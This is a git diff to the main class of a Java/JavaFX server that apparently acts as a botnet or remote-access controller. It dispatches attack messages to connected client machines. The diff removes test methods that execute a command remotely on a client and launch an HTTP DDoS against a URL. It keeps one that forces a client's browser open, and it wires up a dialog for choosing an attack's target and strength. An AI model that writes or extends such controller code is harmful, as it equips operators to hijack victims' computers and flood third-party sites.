@@ -7,6 +7,7 @@ package br.com.view;
  * Time: 18:42
  */
 
+import br.com.controller.ClientAttackDialogController;
 import br.com.controller.ClientController;
 import br.com.core.Server;
 import br.com.core.callback.OnServerCallback;
@@ -21,6 +22,7 @@ import javafx.scene.Scene;
 import javafx.scene.image.Image;
 import javafx.scene.layout.AnchorPane;
 import javafx.scene.layout.BorderPane;
+import javafx.stage.Modality;
 import javafx.stage.Stage;
 import model.GenericMessage;
 import model.constant.ClientStatusEnum;
@@ -57,23 +59,11 @@ public class MainApp extends Application implements OnServerCallback {
         loadContent();
     }
 
-    private void test1(ClientTableRow row) {
-        GenericMessage mspaint = AttackBuilder.buildCommandLineExecuter()
-                .withCommand("mspaint")
-                .build();
-        mServer.sendMsgToClient(row, mspaint);
-    }
-
     private void test2(ClientTableRow row) {
         GenericMessage build = AttackBuilder.buildBrowserOpening()
                 .withURL("www.youtube.com.br")
                 .build();
         mServer.sendMsgToClient(row, build);
-    }
-
-    private void test3(ClientTableRow row) {
-        GenericMessage genericMessage = AttackBuilder.buildDDOSAttack().withUrl("https://www.aaa.com").withQuantity(5).buildHTTP();
-        mServer.sendMsgToClient(row, genericMessage);
     }
 
     public void startServer(int port) {
@@ -160,9 +150,9 @@ public class MainApp extends Application implements OnServerCallback {
 
         //test2(client);
 
-        test3(client);
+        //test3(client);
 
-        /*// Mostrar url de destino e potencia
+        // Mostrar url de destino e potencia
         try {
             // Carrega o arquivo fxml e cria um novo stage para a janela popup
             FXMLLoader loader = new FXMLLoader();
@@ -181,6 +171,7 @@ public class MainApp extends Application implements OnServerCallback {
             ClientAttackDialogController controller = loader.getController();
             controller.setmDialogStage(dialogStage);
             controller.setClient(client);
+            controller.setServer(mServer);
 
             //Mostra a janela e espera até o usuario fechar.
             dialogStage.showAndWait();
@@ -189,7 +180,6 @@ public class MainApp extends Application implements OnServerCallback {
         } catch (IOException e) {
             e.printStackTrace();
             return false;
-        }*/
-        return true;
+        }
     }
 }
